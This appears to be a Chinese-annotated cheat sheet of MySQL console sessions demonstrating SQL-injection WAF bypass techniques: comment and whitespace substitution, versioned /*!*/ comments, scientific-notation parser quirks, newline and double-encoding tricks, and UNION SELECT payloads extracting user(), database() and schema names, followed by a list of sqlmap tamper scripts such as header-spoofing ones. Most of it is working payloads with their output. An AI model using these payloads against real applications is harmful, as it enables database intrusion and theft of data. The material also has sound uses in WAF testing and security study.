mysql> select'id', id, name,3e0from students;  #去除空格
+----+----+--------+-----+
| id | id | name   | 3e0 |
+----+----+--------+-----+
| id |  1 | Tiger  |   3 |
| id |  2 | Tina   |   3 |
| id |  3 | Felica |   3 |
+----+----+--------+-----+
3 rows in set (0.00 sec)
mysql> select(count(3))from(students); #括号分割
+------------+
| (count(3)) |
+------------+
|          3 |
+------------+
1 row in set (0.00 sec)
mysql> select  #换行分割
    -> count(3)
    -> from
    -> students;
+----------+
| count(3) |
+----------+
|        3 |
+----------+
1 row in set (0.00 sec)
mysql> select name from students where name like 0x5425; #十六进制表示字符串
+-------+
| name  |
+-------+
| Tiger |
| Tina  |
+-------+
2 rows in set (0.00 sec)
mysql> select name from students where name like char(84,37); #使用char函数表示字符串
+-------+
| name  |
+-------+
| Tiger |
| Tina  |
+-------+
2 rows in set (0.00 sec)
mysql> select '10'*3e0; #'10'会被转换为整形然后乘以3最后乘以10^0
+----------+
| '10'*3e0 |
+----------+
|       30 |
+----------+
1 row in set (0.00 sec)

mysql> select '100'*3e1;
+-----------+
| '100'*3e1 |
+-----------+
|      3000 |
+-----------+
1 row in set (0.00 sec)

mysql> select '100'*3e2;
+-----------+
| '100'*3e2 |
+-----------+
|     30000 |
+-----------+
1 row in set (0.00 sec)

mysql> select /*!**/ from students; #使用/*!*/逃逸
+----+--------+--------+------+
| id | name   | gender | age  |
+----+--------+--------+------+
|  1 | Tiger  | male   |   27 |
|  2 | Tina   | female |   28 |
|  3 | Felica | female |   26 |
+----+--------+--------+------+
3 rows in set (0.00 sec)

mysql> select /*!* from*/ students;
+----+--------+--------+------+
| id | name   | gender | age  |
+----+--------+--------+------+
|  1 | Tiger  | male   |   27 |
|  2 | Tina   | female |   28 |
|  3 | Felica | female |   26 |
+----+--------+--------+------+
3 rows in set (0.00 sec)

mysql> select /*!* from students*/;
+----+--------+--------+------+
| id | name   | gender | age  |
+----+--------+--------+------+
|  1 | Tiger  | male   |   27 |
|  2 | Tina   | female |   28 |
|  3 | Felica | female |   26 |
+----+--------+--------+------+
3 rows in set (0.00 sec)

mysql> /*!select * from students*/;
+----+--------+--------+------+
| id | name   | gender | age  |
+----+--------+--------+------+
|  1 | Tiger  | male   |   27 |
|  2 | Tina   | female |   28 |
|  3 | Felica | female |   26 |
+----+--------+--------+------+
3 rows in set (0.00 sec)

mysql> select-id+1-1 from students;
+---------+
| -id+1-1 |
+---------+
|      -1 |
|      -2 |
|      -3 |
+---------+
3 rows in set (0.00 sec)

mysql> select-id+1-1.from students;
+----------+
| -id+1-1. |
+----------+
|       -1 |
|       -2 |
|       -3 |
+----------+
3 rows in set (0.00 sec)

mysql> /*!50000select*/ id from students; #50000版本号
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)

mysql> select `version`();
+-------------+
| `version`() |
+-------------+
| 8.0.21      |
+-------------+
1 row in set (0.00 sec)

mysql> /*!60000select*/ id from students;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)

mysql> /*!70000select*/ id from students;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)

mysql> /*!80000select*/ id from students;
+----+
| id |
+----+
|  1 |
|  2 |
|  3 |
+----+
3 rows in set (0.00 sec)

mysql> /*!90000select*/ id from students;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'id from students' at line 1

mysql> select-count(3)outcome from students; #可以省略as和空格
+---------+
| outcome |
+---------+
|      -3 |
+---------+
1 row in set (0.00 sec)

mysql> select/*!**/from students;
+----+--------+--------+------+
| id | name   | gender | age  |
+----+--------+--------+------+
|  1 | Tiger  | male   |   27 |
|  2 | Tina   | female |   28 |
|  3 | Felica | female |   26 |
+----+--------+--------+------+
3 rows in set (0.00 sec)

mysql> select substr(user() from 1 for 3)outcome;
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)

mysql> select substr(user()from 1 for 3)outcome;
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)

mysql> select mid(user()from 1 for 3)outcome;
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)

mysql> select mid(user()from 1 for 3)outcome limit 1; #使用from for来替换函数中的','
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)

mysql> select mid(user()from 1 for 3)outcome limit 1,1;
Empty set (0.00 sec)

mysql> select mid(user()from 1 for 3)outcome limit 1 offset 1; #使用offset替换','
Empty set (0.00 sec)

mysql> select mid(user(),1,3)outcome;  #如果使用mid函数或者substr函数则会使用','分隔符来分割参数
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)

mysql> select substr(user(),1,3)outcome;
+---------+
| outcome |
+---------+
| roo     |
+---------+
1 row in set (0.00 sec)


mysql> select * from students where name in ('Tiger');
+----+-------+--------+------+
| id | name  | gender | age  |
+----+-------+--------+------+
|  1 | Tiger | male   |   27 |
+----+-------+--------+------+
1 row in set (0.00 sec)

mysql> select substr(name, 1,1) in ('T') from students;
+----------------------------+
| substr(name, 1,1) in ('T') |
+----------------------------+
|                          1 |
|                          1 |
|                          0 |
+----------------------------+
3 rows in set (0.00 sec)

mysql> select strcmp(left(name,1),'T') from students;
+--------------------------+
| strcmp(left(name,1),'T') |
+--------------------------+
|                        0 |
|                        0 |
|                       -1 |
+--------------------------+
3 rows in set (0.00 sec)

mysql> select * from students where name between 'R' and 'U'; #使用between替换<>
+----+-------+--------+------+
| id | name  | gender | age  |
+----+-------+--------+------+
|  1 | Tiger | male   |   27 |
|  2 | Tina  | female |   28 |
+----+-------+--------+------+
2 rows in set (0.00 sec)

mysql> show databases; #从information_schema中的SCHEMATA表获取的信息
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| test               |
+--------------------+
5 rows in set (0.00 sec)

mysql> show tables from test; #从information_schema中的TABLES表获取的信息 
+----------------+
| Tables_in_test |
+----------------+
| students       |
+----------------+
1 row in set (0.00 sec)

mysql> show columns from test.students;  #从information_schema中的COLUMNS表获取的信息  
+--------+--------------+------+-----+---------+-------+
| Field  | Type         | Null | Key | Default | Extra |
+--------+--------------+------+-----+---------+-------+
| id     | int          | NO   | PRI | NULL    |       |
| name   | varchar(255) | YES  |     | NULL    |       |
| gender | varchar(255) | YES  |     | NULL    |       |
| age    | int          | YES  |     | NULL    |       |
+--------+--------------+------+-----+---------+-------+
4 rows in set (0.00 sec)

mysql> select 1,2 from students /*!union/**//**/all*//*!select*//*!user*/(),/*!database*/();
+----------------+------+
| 1              | 2    |
+----------------+------+
| 1              | 2    |
| 1              | 2    |
| 1              | 2    |
| 1              | 2    |
| root@localhost | test |
+----------------+------+
5 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select user(),database(); #使用科学计数法
+----------------+------+
| 1              | 2    |
+----------------+------+
| 1              | 2    |
| root@localhost | test |
+----------------+------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select+1,user(); #使用'+'
+---+----------------+
| 1 | 2              |
+---+----------------+
| 1 | 2              |
| 1 | root@localhost |
+---+----------------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select-1,user(); #使用'-'
+----+----------------+
| 1  | 2              |
+----+----------------+
|  1 | 2              |
| -1 | root@localhost |
+----+----------------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select!1,user(); #使用'!'
+---+----------------+
| 1 | 2              |
+---+----------------+
| 1 | 2              |
| 0 | root@localhost |
+---+----------------+
2 rows in set, 1 warning (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select~1,user(); #使用'~'
+----------------------+----------------+
| 1                    | 2              |
+----------------------+----------------+
|                    1 | 2              |
| 18446744073709551614 | root@localhost |
+----------------------+----------------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select~1,(select user());
+----------------------+----------------+
| 1                    | 2              |
+----------------------+----------------+
|                    1 | 2              |
| 18446744073709551614 | root@localhost |
+----------------------+----------------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select~1,(select `schema_name` from information_schema.schemata limit 1);  #使用'``'
+----------------------+-------+
| 1                    | 2     |
+----------------------+-------+
|                    1 | 2     |
| 18446744073709551614 | mysql |
+----------------------+-------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=1e0union all select@`id`,(select `schema_name` from information_schema.schemata limit 1); #使用@``
+------------+-------+
| 1          | 2     |
+------------+-------+
| 0x31       | 2     |
| 0x         | mysql |
+------------+-------+
2 rows in set (0.00 sec)

mysql> select 1,2 from students where id=.1union all select+1,(select `schema_name` from information_schema.schemata limit 1); #使用'.'符号
+---+-------+
| 1 | 2     |
+---+-------+
| 1 | mysql |
+---+-------+
1 row in set (0.00 sec)

mysql> select 1,2 from students where id=.1union/**/ all select+1,(select `schema_name` from information_schema.schemata limit 1);
+---+-------+
| 1 | 2     |
+---+-------+
| 1 | mysql |
+---+-------+
1 row in set (0.00 sec)

mysql> select 1,2 from students where id=.1union/*.1*/ all select+1,(select `schema_name` from information_schema.schemata limit 1);
+---+-------+
| 1 | 2     |
+---+-------+
| 1 | mysql |
+---+-------+
1 row in set (0.00 sec)

mysql> select 1,2 from students where id=.1union/*.1*/ all select'1',(select `schema_name` from information_schema.schemata limit 1); #使用单引号
+---+-------+
| 1 | 2     |
+---+-------+
| 1 | mysql |
+---+-------+
1 row in set (0.00 sec)

mysql> select 1,2 from students where id=.1union/*.1*/ all select"1",(select `schema_name` from information_schema.schemata limit 1);  #使用双引号
+---+-------+
| 1 | 2     |
+---+-------+
| 1 | mysql |
+---+-------+
1 row in set (0.00 sec)

mysql> select 1 from students where id=1|@name := (select user()) union select @name; #使用变量
+----------------+
| 1              |
+----------------+
| 1              |
| root@localhost |
+----------------+
2 rows in set, 1 warning (0.01 sec)

mysql> select 1 from students  #在浏览器中可以通过%0a来分割sql语句，如果过滤union select关键字可以通过%0a来逃避过滤
    -> /*!50000union       #/*!12345select%0aall*/
    -> select
    -> user()*/;
+----------------+
| 1              |
+----------------+
| 1              |
| root@localhost |
+----------------+
2 rows in set (0.01 sec)

apostrophemask.py 用UTF-8全角字符替换单引号字符
apostrophenullencode.py 用非法双字节unicode字符替换单引号字符
appendnullbyte.py 在payload末尾添加空字符编码
base64encode.py 对给定的payload全部字符使用Base64编码
between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”
bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”
chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）
charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）
charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）
concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例
equaltolike.py 用“LIKE”运算符替换全部等于号“=”
greatest.py 用“GREATEST”函数替换大于号“>”
halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释
ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例
lowercase.py 用小写值替换每个关键字字符
modsecurityversioned.py 用注释包围完整的查询
modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询
multiplespaces.py 在SQL关键字周围添加多个空格
nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器
overlongutf8.py 转换给定的payload当中的所有字符
percentage.py 在每个字符之前添加一个百分号
randomcase.py 随机转换每个关键字字符的大小写
randomcomments.py 向SQL关键字中插入随机注释
securesphere.py 添加经过特殊构造的字符串
sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs
space2comment.py 用“/**/”替换空格符
space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符
space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符
space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符
space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符
space2plus.py 用加号“+”替换空格符
space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符
unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”
unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符
varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAF
versionedkeywords.py 用MySQL注释包围每个非函数关键字
versionedmorekeywords.py 用MySQL注释包围每个关键字
xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF

mysql> select 1 from students where id='1--aa'union select user();
+----------------+
| 1              |
+----------------+
| 1              |
| root@localhost |
+----------------+
2 rows in set, 1 warning (0.01 sec)

mysql> select 1 from students where id='1--aa'union #传递参数1--aa'union%0aselect user，如果waf删除注释--aa'union%0a则会产生绕过
    -> select user();
+----------------+
| 1              |
+----------------+
| 1              |
| root@localhost |
+----------------+
2 rows in set, 1 warning (0.00 sec)

select 1 from students where x=1 union %23 %250a x %0a select user() 
#第一次解码后为，按照该解码结果去除注释后再匹配或者进行语法解析都是可以正常处理的
mysql>select 1 from students where x=1 union # %0a x 
    ->select user()
#第二次解码后为，如果按照第二次解码后的结果进行语法解析，或者去除注释后再匹配都会失败
mysql>select 1 from students where x=1 union # 
    -> x 
    ->select user()

mysql> select id 1.1e, char 10.2e(id 2.e), concat 3.e('a'12356.e,'b'1.e,'c'1.1234e)1.e, 12 1.e*2 1.e, 12 1.e/2 1.e, 12 1.e|2 1.e, 12 1.e^2 1.e, 12 1.e%2 1.e, 12 1.e&2 from test 1.e.test;
+------+----------------------------------------+------------------------------------------+----------+----------+----------+----------+----------+----------+
| id   | char 10.2e(id 2.e)                     | concat 3.e('a'12356.e,'b'1.e,'c'1.1234e) | 12 1.e*2 | 12 1.e/2 | 12 1.e|2 | 12 1.e^2 | 12 1.e%2 | 12 1.e&2 |
+------+----------------------------------------+------------------------------------------+----------+----------+----------+----------+----------+----------+
|    1 | 0x01                                   | abc                                      |       24 |   6.0000 |       14 |       14 |        0 |        0 |
|    2 | 0x02                                   | abc                                      |       24 |   6.0000 |       14 |       14 |        0 |        0 |
|    3 | 0x03                                   | abc                                      |       24 |   6.0000 |       14 |       14 |        0 |        0 |
+------+----------------------------------------+------------------------------------------+----------+----------+----------+----------+----------+----------+
3 rows in set (0.00 sec)

上面查询等价于下面的查询
mysql> select id, char(id), concat('a','b','c'), 12*2, 12/2, 12|2, 12^2, 12%2, 12&2 from test.test;
+------+--------------------+---------------------+------+--------+------+------+------+------+
| id   | char(id)           | concat('a','b','c') | 12*2 | 12/2   | 12|2 | 12^2 | 12%2 | 12&2 |
+------+--------------------+---------------------+------+--------+------+------+------+------+
|    1 | 0x01               | abc                 |   24 | 6.0000 |   14 |   14 |    0 |    0 |
|    2 | 0x02               | abc                 |   24 | 6.0000 |   14 |   14 |    0 |    0 |
|    3 | 0x03               | abc                 |   24 | 6.0000 |   14 |   14 |    0 |    0 |
+------+--------------------+---------------------+------+--------+------+------+------+------+
3 rows in set (0.00 sec)

科学计数法的bug，解析科学标记法过程中碰到上面case会把token 3.e/1.e丢弃，1.e后面可以跟如下字符( ) . , | & % * ^ /。
It should be noted that the number in the keyword “1.e” does not matter. Any number can be in between the dot and the “e”, and that the dot is mandatory (e.g. “1337.1337e” also works).



